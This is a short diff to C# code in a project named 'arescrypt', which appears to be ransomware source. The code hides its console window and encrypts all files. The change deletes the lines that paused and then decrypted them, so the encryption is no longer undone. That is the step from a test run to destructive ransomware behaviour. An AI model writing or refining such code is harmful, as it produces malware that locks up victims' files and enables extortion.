@@ -17,9 +17,6 @@ namespace arescrypt
                 Miscellaneous.HideWindow();
 
             que.EncryptAllFiles();
-            Console.WriteLine("All files encrypted. Press any key to launch decryption.");
-            Console.ReadKey();
-            que.DecryptAllFiles();
             
             // Giving "Debug Mode" switch in Configuration it's usability
             if (config.debugMode) // == true
